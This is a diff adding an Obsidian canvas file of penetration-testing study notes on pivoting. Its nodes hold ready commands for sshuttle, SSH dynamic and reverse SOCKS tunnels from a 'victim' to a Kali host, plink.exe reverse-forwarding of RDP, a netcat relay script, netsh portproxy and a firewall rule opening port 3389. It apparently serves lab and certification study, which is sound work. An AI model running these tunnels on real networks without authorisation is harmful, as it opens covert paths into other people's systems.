@@ -1,0 +1,40 @@
+{
+	"nodes":[
+		{"id":"c0d47e8669141936","type":"file","file":"NOTES/99. TOOLS/Metasploit/msf_port_forwarding.md","x":-1360,"y":-880,"width":1120,"height":320},
+		{"id":"fcbe0d3d326673f8","type":"file","file":"NOTES/99. TOOLS/Metasploit/msf_pivoting.md","x":-1360,"y":-499,"width":1120,"height":859},
+		{"id":"dcf654f9a4090eed","type":"text","text":"# SSH based","x":837,"y":-420,"width":250,"height":60},
+		{"id":"53fc5839abe4ec9d","type":"text","text":"# PIVOTING","x":837,"y":-1180,"width":250,"height":69,"color":"1"},
+		{"id":"5700be3c06aa9223","type":"text","text":"# sshuttle\nhttps://github.com/sshuttle/sshuttle\n\nhttps://sshuttle.readthedocs.io/en/stable/usage.html\n```bash\n$ sshuttle -r username@sshserver 0.0.0.0/0 # forward ALL traffic\n\n$ sshuttle -r database_admin@192.168.198.63:2222 10.4.198.0/24 172.16.198.0/24 # connect to 10.4.198.0/24 172.16.198.0/24 via ssh connection to database_admin@192.168.198.63:2222\n```","x":140,"y":-99,"width":1940,"height":360},
+		{"id":"867a5beaa5bbafa3","type":"text","text":"# $ vpnpivot\nhttps://github.com/0x36/VPNPivot/blob/master/README.md","x":3173,"y":-2840,"width":453,"height":153},
+		{"id":"fe554506dfda4bf7","type":"file","file":"NOTES/99. TOOLS/chisel/chisel.md","x":3173,"y":-2534,"width":1000,"height":1054},
+		{"id":"c6f2bcc2d25b3e54","type":"text","text":"# SOCKS proxy created with SSH Dynamic Port Forwarding \n```bash\n# kali\n$ ssh -N -D 0.0.0.0:9050 tunneluser@1.1.1.1  # SSH connection from attacker to victim\n```\n```bash\n/etc/proxychains.conf\n[ProxyList]\nsocks5  127.0.0.1 9050\n```\n```bash\n$ proxychains curl http://pxeboot.za.tryhackme.com\n```\n#  SOCKS proxy created with SSH Dynamic Reverse Port Forwarding \nkali runs ssh server, victim \n```bash\n# victim\n$ ssh -R [<interface_IP>:]<port> kali@<attackerIP> # ssh connection from victim to attacker\n$ ssh -N -R 9998 kali@192.168.118.4 # reverse dunamic port forwarding from localhost:9998 at kali through ssh tunel  \n```\n```bash\n/etc/proxychains.conf\n[ProxyList]\nsocks5  127.0.0.1 9998\n```\n```bash\n$ proxychains curl http://pxeboot.za.tryhackme.com\n```","x":1087,"y":341,"width":993,"height":939},
+		{"id":"59387989bc603f81","type":"text","text":"# plink.exe\nPutty Link \n```Powershell\nC:\\Windows\\Temp> .\\plink.exe -ssh -l <user> -pw <passwd> <IP> \n  -D [listen-IP:]listen-port\n            Dynamic SOCKS-based port forwarding\n  -L [listen-IP:]listen-port:host:port\n            Forward local port to remote address\n  -R [listen-IP:]listen-port:host:port\n            Forward remote port to local address\n\nC:\\Windows\\Temp> .\\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.235\n```\n```Powershell\n# emulate the confirmation that we usually type when prompted\ncmd>/PS> cmd.exe /c echo y | .\\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.235\n```","x":2160,"y":-79,"width":1135,"height":509},
+		{"id":"0948da4412e38c9b","type":"text","text":"# netcat port forwarding\nhttps://gist.github.com/holly/6d52dd9addd3e58b2fd5\n```bash\n$ ./nc-tcp-forward.sh 8080 localhost 22\n\n$ cat nc-tcp-forward.sh\n#!/usr/bin/env bash\nset -e\nif [ $# != 3 ]; then\n        echo 'Usage: nc-tcp-forward.sh $FRONTPORT $BACKHOST $BACKPORT' >&2\n        exit 1\nfi\nFRONTPORT=$1\nBACKHOST=$2\nBACKPORT=$3\nFIFO=/tmp/backpipe\ntrap 'echo \"trapped.\"; pkill nc; rm -f $FIFO; exit 1' 1 2 3 15\nmkfifo $FIFO\nwhile true; do\n        nc -l $FRONTPORT <$FIFO | nc $BACKHOST $BACKPORT >$FIFO\ndone\nrm -f $FIFO\n```","x":-740,"y":-1620,"width":680,"height":620},
+		{"id":"d41608bcbee4f335","type":"file","file":"NOTES/99. TOOLS/socat/socat_port_forwarding.md","x":-740,"y":-1840,"width":680,"height":200},
+		{"id":"321f3f382ca2df3b","type":"text","text":"# netsh (Network Shell) (Windows native)\nnative way to create a port forward on Windows\nbuilt-in firewall configuration tool\n**requires administrative privileges** to create a port forward on Windows\n\nThe _portproxy_ subcontext of the _netsh interface_ command requires administrative privileges to make any changes. This means that in most cases we will need to take UAC into account. In this example, we're running it in a shell over RDP using an account with administrator privileges, so UAC is not a concern. However, we should bear in mind that UAC may be a stumbling block in other setups.\n```bash\ncmd> netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp\n# Example:\ncmd> netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4545 connectaddress=10.4.198.215 connectport=4545\n# Check the port forward was created:\ncmd> netsh interface portproxy show all\ncmd> netsh interface portproxy show v4tov4\n# Delete port forward\ncmd> netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444\n```","x":2095,"y":-1000,"width":1085,"height":520},
+		{"id":"391be5f7c8433b74","type":"text","text":"# Windows","x":1600,"y":-800,"width":302,"height":120},
+		{"id":"e38e7f763f07d1fc","type":"text","text":"# firwall rule\nport is being opened on the pivot host, we might need to create a firewall rule to allow any connections to that port:\n\n```powershell\n# add rule\nPS> netsh advfirewall firewall add rule name=\"Open Port 3389\" dir=in action=allow protocol=TCP localport=3389\n# rememmber to delete rule\nPS> netsh advfirewall firewall delete rule name=\"Open Port 3389\"\n```","x":3280,"y":-885,"width":960,"height":290},
+		{"id":"527a74129fd2df32","type":"link","url":"https://www.cyberciti.biz/faq/linux-unix-tcp-port-forwarding/","x":-1522,"y":-2020,"width":782,"height":280},
+		{"id":"4a6843e432c845fa","type":"link","url":"https://docs.h4rithd.com/tools/pivoting-forwarding","x":-260,"y":-3280,"width":1232,"height":759},
+		{"id":"3c4887f78d879c23","type":"file","file":"NOTES/99. TOOLS/ligolo-ng/ligolo-ng.md","x":1146,"y":-3420,"width":814,"height":1540},
+		{"id":"0a6885f889bb2415","type":"file","file":"NOTES/99. TOOLS/ssh/ssh_port_forwarding.md","x":140,"y":341,"width":920,"height":939}
+	],
+	"edges":[
+		{"id":"95224e21074d63f1","fromNode":"53fc5839abe4ec9d","fromSide":"left","toNode":"c0d47e8669141936","toSide":"right"},
+		{"id":"e575f09309252d0b","fromNode":"53fc5839abe4ec9d","fromSide":"right","toNode":"3c4887f78d879c23","toSide":"bottom"},
+		{"id":"fef71d05a02e10d6","fromNode":"53fc5839abe4ec9d","fromSide":"left","toNode":"fcbe0d3d326673f8","toSide":"right"},
+		{"id":"c9fb831faa0d5b86","fromNode":"53fc5839abe4ec9d","fromSide":"right","toNode":"fe554506dfda4bf7","toSide":"left"},
+		{"id":"39f3c84a1b37f441","fromNode":"dcf654f9a4090eed","fromSide":"bottom","toNode":"0a6885f889bb2415","toSide":"top"},
+		{"id":"33a6920618991942","fromNode":"53fc5839abe4ec9d","fromSide":"right","toNode":"867a5beaa5bbafa3","toSide":"left"},
+		{"id":"c997f350fcbd073f","fromNode":"53fc5839abe4ec9d","fromSide":"top","toNode":"d41608bcbee4f335","toSide":"right"},
+		{"id":"0a2cbf33784dede3","fromNode":"321f3f382ca2df3b","fromSide":"right","toNode":"e38e7f763f07d1fc","toSide":"left"},
+		{"id":"1f84d1c64acbef63","fromNode":"53fc5839abe4ec9d","fromSide":"top","toNode":"0948da4412e38c9b","toSide":"right"},
+		{"id":"cb10d8a7bbb61f1d","fromNode":"dcf654f9a4090eed","fromSide":"bottom","toNode":"c6f2bcc2d25b3e54","toSide":"top"},
+		{"id":"815154b76e22c100","fromNode":"dcf654f9a4090eed","fromSide":"bottom","toNode":"5700be3c06aa9223","toSide":"top"},
+		{"id":"93bd31bb1243f8df","fromNode":"53fc5839abe4ec9d","fromSide":"bottom","toNode":"dcf654f9a4090eed","toSide":"top"},
+		{"id":"db65ad637309af9f","fromNode":"dcf654f9a4090eed","fromSide":"right","toNode":"59387989bc603f81","toSide":"top"},
+		{"id":"1219aff02126d515","fromNode":"53fc5839abe4ec9d","fromSide":"bottom","toNode":"391be5f7c8433b74","toSide":"left"},
+		{"id":"bdf2ea4dba8f8eca","fromNode":"391be5f7c8433b74","fromSide":"right","toNode":"321f3f382ca2df3b","toSide":"left"},
+		{"id":"027200d9d9144a78","fromNode":"391be5f7c8433b74","fromSide":"bottom","toNode":"59387989bc603f81","toSide":"top"}
+	]
+}
